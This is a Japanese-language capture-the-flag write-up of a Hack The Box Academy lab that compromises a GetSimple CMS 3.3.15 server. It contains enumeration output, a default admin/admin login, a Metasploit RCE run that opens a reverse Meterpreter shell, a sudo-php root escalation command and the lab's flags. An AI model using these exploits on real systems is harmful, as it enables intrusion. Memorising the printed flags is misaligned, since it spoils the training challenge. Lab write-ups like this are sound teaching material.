---
{"dg-publish":true,"permalink":"/hack-the-box-academy/penetration-testing-process-knowledge-check-writeup/"}
---


![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : 
- #easy #medium #hard #insane
- OS : #Linux #Windows
- Machine Author(s): 
- Hack Date: 2025-02-11,13:23

---

# Enumeration
使用ツールのオプションが定型化してきてきたのでこの[スクリプト](https://github.com/crum7/HTBScript/blob/main/Enumeration.sh)を使用している

どのポートが空いている?
- 22 番
- 80 番

| ポート | サービス | バージョン                                                        | その他 |
| --- | ---- | ------------------------------------------------------------ | --- |
| 22  | ssh  | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) |     |
| 80  | http | Apache httpd 2.4.41 ((Ubuntu))                               |     |

## nmap
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyjE3IszCWTkwVItyz5yZxbgFhlqWM5o/4ZgDpPgt3QXKAawOgZbp7tSkTV7rVtI1pWlJf+o1c8Yo2MoIrlZVoYcKF3h35k12p+vzy3ZDqzF7jL2tJ95uYfk9WuKh1B8VLJegno2zkxYTzNzYGWrG1qkV61r2UjPYWzRVcHDRrNsxxgGpUF1AJcADWEModm3jpSksUGWUbgNqLoYTPYgFNBKeURrlABB8/ykIsqXLR3wVWIC5L8uslM4+qFGkCbdV+REUlBRzIdaC54lHeTF8JhShQnOuXgPdLp06slStSKcq+V/0gKhSDqm9TQITDNwglQm6ZkqQh0j0FaMt3GMwJB4N6eoGhceV3L7gOfmXd5UK2BYZqOOwiHTR6m+HIDKPdgOMTOCyDxVGCmuW6hu5GcOE0tO7ioU5p7vHTfw9jeyoCnXSNhpEY9JR2IKHlRaIPibfG1GUP0K09J/jaSCc2Eb2yW3r19V3F/6wI7iRbTyD3Hom90p0p6OyVKJyeh20=
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCL6NQmgxEaM6Pafc7ISrlPW491jht6Zf0Lvsb4P3DAbfT3j3h1fe74WgF2xG3FngdXDc40dkHVzfYpTqqCsNrU=
|   256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPfBXQPlIkQDU20q4l5MNZxG3ixQyUahJPci3gvdgKls
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## whatweb
```bash
whatweb http://10.129.138.201
http://10.129.138.201 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.138.201], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
```


## Feroxbuster
- http://gettingstarted.htb/admin/inc/tmp/tmp-admin.xml
```
	This XML document is meant to change the colors within the GetSimple 3.0 Administrative Console
	******************************************************************************************************
	A few things to make note of:
		1. There are a couple images within `/admin/template/images` that might need to change as a result
		2. This is to be placed in the root of `/themes/` as `admin.xml`
		3. Colors need the hash in front of the numbers. eg: #333333
		4. Do not use shortcut hex values. eg. #333
		5. Only works with GetSimple version 3.0
```

- http://gettingstarted.htb/data/users/admin.xml
	- ユーザー名とパスワードがわかった。
```
<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
```
- これで、ログインページからログインできるのかと思ったけど、ログインできない
	- パスワードが違うらしい
		- http://gettingstarted.htb/data/other/logs/failedlogins.log
	- 更新されたのかな？
	- 試しにadmin/adminでログインしたらログインできて草
	  

- http://gettingstarted.htb/data/other/authorization.xml
```
<item>
<apikey>4f399dc72ff8e619e327800f851e9986</apikey>
</item>
```

使ってるテーマの名前とバージョン
* DD_belatedPNG
* Version: 0.0.8a
	- http://gettingstarted.htb/theme/Innovation/assets/js/dd_belatedpng.js
	- サイトの中身だとInnovationって名前？



```sh
└──╼ [★]$ feroxbuster -u http://gettingstarted.htb/
                                                                                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://gettingstarted.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      324c http://gettingstarted.htb/admin => http://gettingstarted.htb/admin/
200      GET      226l      835w     7067c http://gettingstarted.htb/theme/Innovation/assets/css/reset.css
301      GET        9l       28w      323c http://gettingstarted.htb/data => http://gettingstarted.htb/data/
301      GET        9l       28w      328c http://gettingstarted.htb/admin/inc => http://gettingstarted.htb/admin/inc/
200      GET        1l        6w       35c http://gettingstarted.htb/theme/Innovation/sidebar.inc.php
200      GET        1l        6w       35c http://gettingstarted.htb/theme/Innovation/header.inc.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/logging.class.php
200      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/api.class.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/login_functions.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/basic.php
200      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/security_functions.php
500      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/configuration.php
200      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/nonce.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/caching_functions.php
200      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/xss.php
302      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/thumb.php => index.php?redirect=thumb.php?
301      GET        9l       28w      326c http://gettingstarted.htb/plugins => http://gettingstarted.htb/plugins/
500      GET        0l        0w        0c http://gettingstarted.htb/plugins/anonymous_data.php
500      GET        0l        0w        0c http://gettingstarted.htb/plugins/InnovationPlugin.php
200      GET        0l        0w        0c http://gettingstarted.htb/plugins/anonymous_data/lang/en_US.php
500      GET        2l        6w       64c http://gettingstarted.htb/admin/template/sidebar-support.php
500      GET        3l        5w       65c http://gettingstarted.htb/admin/template/footer.php
500      GET        2l        6w       63c http://gettingstarted.htb/admin/template/sidebar-plugins.php
500      GET        2l        7w       75c http://gettingstarted.htb/admin/template/sidebar-settings.php
500      GET        2l        6w       60c http://gettingstarted.htb/admin/template/sidebar-theme.php
500      GET        2l        6w       63c http://gettingstarted.htb/admin/template/sidebar-backups.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/template/header.php
500      GET        2l        6w       61c http://gettingstarted.htb/admin/template/sidebar-files.php
200      GET       44l       99w      682c http://gettingstarted.htb/admin/template/css-wide.php
500      GET        0l        0w        0c http://gettingstarted.htb/admin/template/include-nav.php
200      GET        4l       13w      275c http://gettingstarted.htb/theme/Innovation/assets/images/break.png
200      GET      327l      770w     7293c http://gettingstarted.htb/theme/Innovation/style.css
200      GET        7l       27w     1980c http://gettingstarted.htb/theme/Innovation/assets/images/share.png
301      GET        9l       28w      326c http://gettingstarted.htb/backups => http://gettingstarted.htb/backups/
200      GET     2112l     5042w    42249c http://gettingstarted.htb/admin/template/css.php
200      GET      152l      504w     5485c http://gettingstarted.htb/
200      GET      102l      399w     5268c http://gettingstarted.htb/theme/Cardinal/style.css
200      GET        1l        6w       35c http://gettingstarted.htb/theme/Cardinal/template.php
200      GET        1l        6w       35c http://gettingstarted.htb/theme/Innovation/template.php
200      GET        1l        6w       35c http://gettingstarted.htb/theme/Innovation/footer.inc.php
200      GET        1l        6w       35c http://gettingstarted.htb/theme/Innovation/functions.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/plugin_functions.php
200      GET       87l      371w     6171c http://gettingstarted.htb/admin/inc/timezone_options.txt
302      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/ajax.php => index.php?redirect=ajax.php?
200      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/common.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/template_functions.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/cookie_functions.php
200      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/image.class.php
500      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/ZipArchive.php
500      GET        0l        0w        0c http://gettingstarted.htb/admin/inc/api.plugin.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/theme_functions.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/inc/imagemanipulation.php
301      GET        9l       28w      324c http://gettingstarted.htb/theme => http://gettingstarted.htb/theme/
200      GET        2l        4w      221c http://gettingstarted.htb/data/users/admin.xml
200      GET       21l       50w     1495c http://gettingstarted.htb/theme/Cardinal/images/bg.png
200      GET        2l        4w      114c http://gettingstarted.htb/data/other/authorization.xml
200      GET       12l       46w      869c http://gettingstarted.htb/data/other/components.xml
200      GET       27l      164w     2077c http://gettingstarted.htb/data/pages/index.xml
200      GET        2l       23w      457c http://gettingstarted.htb/data/other/404.xml
200      GET        2l       23w      457c http://gettingstarted.htb/admin/inc/tmp/tmp-404.xml
200      GET        2l        4w      251c http://gettingstarted.htb/data/other/plugins.xml
200      GET        2l        4w      225c http://gettingstarted.htb/data/other/website.xml
200      GET        1l        8w      109c http://gettingstarted.htb/data/cache/2a4c6447379fba09620ba05582eb61af.txt
200      GET        2l       15w      584c http://gettingstarted.htb/data/other/pages.xml
200      GET       27l      164w     2128c http://gettingstarted.htb/admin/inc/tmp/tmp-index.xml
200      GET       58l      185w     1526c http://gettingstarted.htb/admin/inc/tmp/tmp-admin.xml
200      GET       96l      640w    52433c http://gettingstarted.htb/theme/Innovation/images/screenshot.png
200      GET        1l     3013w    35357c http://gettingstarted.htb/data/cache/stylesheet.txt
200      GET        0l        0w        0c http://gettingstarted.htb/plugins/InnovationPlugin/lang/en_US.php
200      GET      172l      978w    81468c http://gettingstarted.htb/theme/Cardinal/images/screenshot.png
301      GET        9l       28w      333c http://gettingstarted.htb/admin/template => http://gettingstarted.htb/admin/template/
500      GET        2l        7w       70c http://gettingstarted.htb/admin/template/sidebar-pages.php
200      GET        1l        6w       35c http://gettingstarted.htb/admin/template/error_checking.php
200      GET       29l       98w      787c http://gettingstarted.htb/admin/template/ie6.css
200      GET     2112l     5046w    42522c http://gettingstarted.htb/admin/template/style.php
200      GET      531l     1758w    19747c http://gettingstarted.htb/admin/template/js/jquery-scrolltofixed.js
200      GET      608l     1464w    19909c http://gettingstarted.htb/admin/template/js/jquery.getsimple.js
301      GET        9l       28w      329c http://gettingstarted.htb/admin/lang => http://gettingstarted.htb/admin/lang/
200      GET       24l       59w      477c http://gettingstarted.htb/admin/inc/tmp/tmp.deny.htaccess
200      GET       24l       59w      481c http://gettingstarted.htb/admin/inc/tmp/tmp.allow.htaccess
200      GET       12l       46w      869c http://gettingstarted.htb/admin/inc/tmp/tmp-components.xml
301      GET        9l       28w      331c http://gettingstarted.htb/data/uploads => http://gettingstarted.htb/data/uploads/
301      GET        9l       28w      330c http://gettingstarted.htb/data/thumbs => http://gettingstarted.htb/data/thumbs/
301      GET        9l       28w      340c http://gettingstarted.htb/admin/template/images => http://gettingstarted.htb/admin/template/images/
[####################] - 9m    180179/180179  0s      found:84      errors:12732  
[####################] - 8m     30000/30000   59/s    http://gettingstarted.htb/ 
[####################] - 8m     30000/30000   59/s    http://gettingstarted.htb/admin/ 
[####################] - 7s     30000/30000   4280/s  http://gettingstarted.htb/theme/Innovation/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4275/s  http://gettingstarted.htb/theme/Innovation/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4347/s  http://gettingstarted.htb/data/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4403/s  http://gettingstarted.htb/admin/inc/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4494/s  http://gettingstarted.htb/data/users/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   59642/s http://gettingstarted.htb/plugins/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   10435/s http://gettingstarted.htb/plugins/InnovationPlugin/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   59642/s http://gettingstarted.htb/plugins/anonymous_data/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   59880/s http://gettingstarted.htb/plugins/anonymous_data/lang/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   8894/s  http://gettingstarted.htb/admin/template/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 9s     30000/30000   3202/s  http://gettingstarted.htb/admin/template/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8m     30000/30000   59/s    http://gettingstarted.htb/admin/lang/ 
[####################] - 1s     30000/30000   59761/s http://gettingstarted.htb/theme/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   59406/s http://gettingstarted.htb/backups/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   58824/s http://gettingstarted.htb/theme/Cardinal/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   59524/s http://gettingstarted.htb/backups/users/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   59524/s http://gettingstarted.htb/backups/pages/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   59524/s http://gettingstarted.htb/backups/other/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   59524/s http://gettingstarted.htb/backups/zip/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   29014/s http://gettingstarted.htb/theme/Cardinal/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   38511/s http://gettingstarted.htb/theme/Innovation/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8m     30000/30000   60/s    http://gettingstarted.htb/data/thumbs/ 
[####################] - 1s     30000/30000   38860/s http://gettingstarted.htb/data/cache/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   57803/s http://gettingstarted.htb/data/other/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   58140/s http://gettingstarted.htb/data/pages/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8m     30000/30000   60/s    http://gettingstarted.htb/data/uploads/ 
[####################] - 6s     30000/30000   4865/s  http://gettingstarted.htb/admin/inc/tmp/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4132/s  http://gettingstarted.htb/plugins/InnovationPlugin/lang/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   57471/s http://gettingstarted.htb/data/other/logs/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   58366/s http://gettingstarted.htb/data/pages/autosave/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8m     30000/30000   60/s    http://gettingstarted.htb/admin/template/images/  
```

## Dirsearch
- /dataを探索してたら、おそらくCMSのバージョンがわかった
	- `{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}`
- ログインページも見つけた
	- http://gettingstarted.htb/admin/
		- Reset Passwordから「admin」というユーザーがあることがわかった
	- admin/adminでログイン可能
- http://gettingstarted.htb/backups/
	- 中に何も入ってない
- 
```bash
└──╼ [★]$ sudo dirsearch --url=http://gettingstarted.htb --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29999

Output File: /home/htb-ac-1632385/reports/http_gettingstarted.htb/_25-02-10_22-40-35.txt

Target: http://gettingstarted.htb/

[22:40:35] Starting: 
[22:40:59] 301 -  324B  - /admin  ->  http://gettingstarted.htb/admin/
[22:40:59] 301 -  326B  - /plugins  ->  http://gettingstarted.htb/plugins/
[22:41:00] 301 -  323B  - /data  ->  http://gettingstarted.htb/data/
[22:41:04] 301 -  326B  - /backups  ->  http://gettingstarted.htb/backups/
[22:41:06] 301 -  324B  - /theme  ->  http://gettingstarted.htb/theme/
[22:42:01] 403 -  283B  - /server-status

```

## FFUF
サブドメインは特にないって
```bash

 :: Method           : GET
 :: URL              : http://gettingstarted.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.gettingstarted.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5485
________________________________________________

:: Progress: [100000/100000] :: Job [1/1] :: 158 req/sec :: Duration: [0:15:16] :: Errors: 514 ::

```

## WebSite
- GetSimple CMS
- ドメインがあったbので。`/etc/hosts`に追加
-  GetSimple CMS – Version 3.3.15 
```
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	debian12-parrot
10.129.138.201  gettingstarted.htb
```


## WebSite Screenshot
![](https://i.imgur.com/TW6tSF7.png)


上のCSSが治っただけっぽいね
gettingstarted.htb
![](https://i.imgur.com/Uw5CzXb.png)


## Wappalyzer
新規情報
- AddThis


- [x] GetSimple CMS 3.3.15 の脆弱性を探す
	- [ ]  [CVE-2019-16333](https://vuldb.com/ja/?source_cve.141807)があるらしい
	- [ ] [CVE2019-11231](https://nvd.nist.gov/vuln/detail/CVE-2019-11231)もある
		- [ ] Metasploitに[exploit](https://www.exploit-db.com/exploits/46880)がある
	- [ ] https://jvndb.jvn.jp/ja/contents/2020/JVNDB-2020-012072.html
- [x] ffuf,feroxbusterで探す
- [ ] 使ってるテーマに脆弱性あるか探す



---

# Foothold
mesploitだと一瞬でできるかもしれないんだけど、それだと面白くないので、CMSの管理画面からReverse Shellを貼ろうと思う

ログインページからadminとしてログイン
- http://gettingstarted.htb/admin/
	- Reset Passwordから「admin」というユーザーがあることがわかった
- admin/adminでログイン可能

サイトはこんな感じで、ファイルをアップロードする画面があるから.shファイルをアップロードしたいんだけど、アップロードボタンがない。

![](https://i.imgur.com/afsqGmb.png)

このページのソースを見たところ
- GetSimple 3.3系では、標準で**Flashベースの「uploadify」プラグイン**を使ってファイルをアップロードする仕組みになっている
- JavaScript が有効で、かつ Flash が正常に動作するブラウザ環境であれば、管理画面右サイドバーの「Upload files and/or images...」というボタン（`#uploadify`）からアップロード可能だが、使ってるfirefoxはflashが無効化されているので出てこない
- だけど、ソースコード下部にある `<noscript>` タグ内に、通常の `<form>` が定義されています。これは **JavaScriptが無効**の場合のみ表示される仕様らしいので、JSを無効にしてみる
![](https://i.imgur.com/RIxZI3N.png)


それでUploadのページをリロードすると、出てきた
![](https://i.imgur.com/g2KHWz8.png)
.phpはアップロードできないらしい
.pngはいける
.php.pngはサーバーがApacheだし行けるかなと思ったら行けなかった。
![](https://i.imgur.com/vtiPwGa.png)

sshはどうなってるんだ？
admin : 上で得られたパスワードでトライしたけど、ログインできなかった。

プラグインも特に編集とかいじることはできなそうだった。
Pages/Add Pagesで、phpかなと思ってもxmlで保存されちゃうからリバースシェル使えない。

Metasploit使います。
はい、特に上で見つけた認証情報とか一切使わずwww-dataとしてログイン完了
```bash
[msf](Jobs:0 Agents:0) >> search GetSimpleCMS

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
   1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/getsimplecms_unauth_code_exec

[msf](Jobs:0 Agents:0) >> use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/getsimplecms_unauth_code_exec) >> show options

Module options (exploit/multi/http/getsimplecms_unauth_code_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the cms
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  95.111.201.45    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   GetSimpleCMS 3.3.15 and before



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/getsimplecms_unauth_code_exec) >> set LHOST 10.10.14.143
LHOST => 10.10.14.143
[msf](Jobs:0 Agents:0) exploit(multi/http/getsimplecms_unauth_code_exec) >> set RHOSTS 10.129.207.200
RHOSTS => 10.129.207.200
[msf](Jobs:0 Agents:0) exploit(multi/http/getsimplecms_unauth_code_exec) >> exploit

[*] Started reverse TCP handler on 10.10.14.143:4444 
[*] Sending stage (39927 bytes) to 10.129.207.200
[*] Meterpreter session 1 opened (10.10.14.143:4444 -> 10.129.207.200:49524) at 2025-02-11 00:07:13 -0600

(Meterpreter 1)(/var/www/html/theme) > 
```

www-dataとしてログインできた。


---

# Lateral Movement
www-dataとしてログインしたけど、このままだと何もできないので、横展開する
まず、横展開先のユーザーを見つける

mrb3nってのが良さそう
```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
```

まず、sshでさっき見つけたパスワードらしきもので、ログインできるのかを確かめる
どれも違うらしい。




---

# Privilege Escalation
横展開を行わずに権限昇格できた。
というのも、`sudo -l` の結果から、**www-data ユーザーがパスワードなし (NOPASSWD) で `/usr/bin/php` を実行できる**ことがわかったので、
```bash
www-data@gettingstarted:/var/www/html/theme$ sudo -l
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

```

任意の PHP コードを root 権限で動かせる。
なので、www-dataから、以下のコマンドを実行することによって、root権限取得できた。
```bash
sudo php -r 'system("/bin/bash");'
```

```bash
root@gettingstarted:/var/www/html/theme# cat /root/root.txt
cat /root/root.txt
f1fba6e9f71efb2630e6e34da6387842
root@gettingstarted:/var/www/html/theme# cat /home/mrb3n/user.txt
cat /home/mrb3n/user.txt
7002d65b149b0a4d19132a66feed21d8

```

## Flags

- **User**: `7002d65b149b0a4d19132a66feed21d8`
- **Root**: `f1fba6e9f71efb2630e6e34da6387842`
---
